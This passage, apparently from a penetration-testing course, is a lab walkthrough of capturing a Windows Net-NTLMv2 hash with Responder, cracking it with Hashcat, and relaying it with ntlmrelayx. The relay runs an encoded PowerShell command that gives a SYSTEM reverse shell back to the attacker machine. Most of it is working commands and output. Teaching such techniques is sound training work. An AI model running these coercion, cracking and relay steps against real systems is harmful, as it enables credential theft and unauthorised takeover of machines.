### 13.3.3 Cracking Net-NTLMv2 Hashes

When we discover a file upload form in a web application on a Windows server, we can attempt to enter a non-existent file with a UNC path, such as `\\192.168.119.2\share\nonexistent.txt`. If the web application supports uploads via SMB, the Windows server will authenticate to our SMB server. This allows us to capture and crack a Net-NTLMv2 hash.

We will set up Responder on our Kali machine as an SMB server and use FILES01 (at 192.168.50.211) as the target. Assuming we have already executed a bind shell on the target system, we will connect to port 4444 with Netcat and check which user is running the bind shell using the `whoami` command. We will then use the `net user` command to determine if the user is a member of the local Administrators group.

```bash
kali@kali:~$ nc 192.168.50.211 4444
Microsoft Windows [Version 10.0.20348.707]
(c) Microsoft Corporation. All rights reserved.
C:\Windows\system32> whoami
files01\paul
C:\Windows\system32> net user paul
User name                    paul
Full Name                    paul power y
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never
Password last set            6/3/2022 10:05:27 AM
Password expires             Never
Password changeable          6/3/2022 10:05:27 AM
Password required            Yes
User may change password     Yes
Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   6/3/2022 10:29:19 AM
Logon hours allowed          All
Local Group Memberships      *Remote Desktop Users *Users
Global Group memberships     *None
The command completed successfully.
```

The output shows that the bind shell runs as the user `paul`, who is not a local administrator on the FILES01 system. However, `paul` is a member of the Remote Desktop Users group, allowing RDP access.

Since we don't have the privileges to run Mimikatz, we cannot extract passwords directly from the system. Instead, we will set up an SMB server with Responder on our Kali machine, connect to it with the user `paul`, and capture the Net-NTLMv2 hash for cracking.

First, we need to retrieve a list of all interfaces using `ip a` and then start Responder with the appropriate interface. For this example, we will use `tap0`.

```bash
kali@kali:~$ ip a
...
3: tap0:  mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 1000
    link/ether 42:11:48:1b:55:18 brd ff:ff:ff:ff:ff:ff
    inet 192.168.119.2/24 scope global tap0
       valid_lft forever preferred_lft forever
    inet6 fe80::4011:48ff:fe1b:5518/64 scope link
       valid_lft forever preferred_lft forever
kali@kali:~$ sudo responder -I tap0
NBT-NS, LLMNR & MDNS Responder 3.1.1.0
Author: Laurent Gaffie (PI:EMAIL)
To kill this script hit CTRL-C
...
HTTP server [ON]
HTTPS server [ON]
WPAD proxy [OFF]
Auth proxy [OFF]
SMB server [ON]
[+] Listening for events...
```

Next, we will request access to a non-existent SMB share on our Responder SMB server using `paul`'s bind shell. We will do this with a simple `dir` listing of `\\192.168.119.2\test`.

```bash
C:\Windows\system32> dir \\192.168.119.2\test
Access is denied.
```

The Responder tab should now show the captured Net-NTLMv2 hash:

```bash
[+] Listening for events...
[SMB] NTLMv2-SSP Client : ::ffff:192.168.50.211
[SMB] NTLMv2-SSP Username : FILES01\paul
[SMB] NTLMv2-SSP Hash :
paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050
CD1777D801B7585DF5719ACFBA0000000002000800360057004D00520001001E00570049004E002D003400
44004E00480055005800430034005400490043000400340057...
```

We will save this hash to `paul.hash` and use Hashcat to crack it. First, we need to identify the correct mode for the Net-NTLMv2 hash.

```bash
kali@kali:~$ cat paul.hash
paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050
CD1777D801B7585DF5719ACFBA0000000002000800360057004D00520001001E00570049004E002D003400
44004E00480055005800430034005400490043000400340057...

kali@kali:~$ hashcat --help | grep -i "ntlm"
5500 | NetNTLMv1 / NetNTLMv1+ESS | Network Protocol
27000 | NetNTLMv1 / NetNTLMv1+ESS (NT) | Network Protocol
5600 | NetNTLMv2 | Network Protocol
27100 | NetNTLMv2 (NT) | Network Protocol
1000 | NTLM | Operating System
```

According to Hashcat, the Net-NTLMv2 hash corresponds to mode 5600. Now, let's attempt to crack the hash using the `rockyou.txt` wordlist.

```bash
kali@kali:~$ hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.5) starting
...
PAUL::FILES01:1f9d4c51f6e74653:795f138ec69c274d0fd53bb32908a72b:010100000000000000b050
cd1777d801b7585df5719acfba0000000002000800360057004d00520001001e00570049004e002d003400
44004e004800550058004300340054004900430004003400570049004e002d00340044004e004800550058
00430034005400490043002e00360057004d0052002e004c004f00430041004c0003001400360057004d00
52002e004c004f00430041004c0005001400360057004d0052002e004c004f00430041004c000700080000
b050cd1777d801060004000200000008003000300000000000000000000000002000008ba7af42bfd51d70
090007951b57cb2f5546f7b599bc577ccd13187cfc5ef4790a001000000000000000000000000000000000
000900240063006900660073002f003100390032002e003100360038002e003100310038002e0032000000
000000000000:123Password123
...
```

The listing shows that we successfully cracked `paul`'s Net-NTLMv2 hash. Let's confirm the password by connecting to FILES01 with RDP.

### 13.3.4 Relaying Net-NTLMv2

In this section, we will have access to FILES01 as an unprivileged user (`files02admin`), which means we cannot run Mimikatz to extract passwords. Using the steps from the previous section, imagine we obtained the Net-NTLMv2 hash but couldn't crack it due to its complexity.

Based on the username, we can assume that `files02admin` may be a local administrator on FILES02. Therefore, we can try to use the hash on another machine in a relay attack.

In this attack, we will again use the `dir` command in the bind shell to create an SMB connection to our Kali machine. Instead of merely printing the Net-NTLMv2 hash used in the authentication step, we will forward it to FILES02. If `files02admin` is a local user of FILES02, the authentication will be accepted. If the relayed authentication is from a user with local administrator privileges, we can use it to execute commands over SMB.

For this example, we will use `ntlmrelayx`, a tool from the Impacket library, to perform the relay attack. We will start `ntlmrelayx` with the necessary options to disable the HTTP server, add support for SMB2, set the target, and specify the command to be executed.

```bash
kali@kali:~$ sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
...
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666
[*] Servers started, waiting for connections
```

Next, we will start a Netcat listener on port 8080 to catch the incoming reverse shell.

```bash
kali@kali:~$ nc -nvlp 8080
listening on [any] 8080 ...
```

Now, we will run Netcat in another terminal to connect to the bind shell on FILES01 (port 5555). After connecting, we will enter `dir \\192.168.119.2\test` to create an SMB connection to our Kali machine.

```bash
kali@kali:~$ nc 192.168.50.211 5555
Microsoft Windows [Version 10.0.20348.707]
(c) Microsoft Corporation. All rights reserved.
C:\Windows\system32> whoami
files01\files02admin
C:\Windows\system32> dir \\192.168.119.2\test
...
```

We should receive an incoming connection in our `ntlmrelayx` tab.

```bash
[*] SMBD-Thread-4: Received connection from 192.168.50.211, attacking target smb://192.168.50.212
[*] Authenticating against smb://192.168.50.212 as FILES01/FILES02ADMIN SUCCEED
[*] SMBD-Thread-6: Connection from 192.168.50.211 controlled, but there are no more targets left!
...
[*] Executed specified command on host: 192.168.50.212
```

Our Netcat listener should have caught the reverse shell.

```bash
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.212] 49674
whoami
nt authority\system
PS C:\Windows\system32> hostname
FILES02
PS C:\Windows\system32> ipconfig
Windows IP Configuration
Ethernet adapter Ethernet0:
   Connection-specific DNS Suffix . :
   Link-local IPv6 Address . . . . . : fe80::7992:61cd:9a49:9046%4
   IPv4 Address. . . . . . . . . . . : 192.168.50.212
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.50.254
```

Listing 309 shows that we could leverage a relay attack to get code execution on FILES02.

### 13.4 Wrapping Up

As penetration testers, we must familiarize ourselves with a variety of password attacks. These attacks can be leveraged in external assessments to breach perimeters via exposed network services or in internal penetration tests to retrieve plaintext passwords or use hashes to access other systems. These skills are crucial for Active Directory environments and beyond.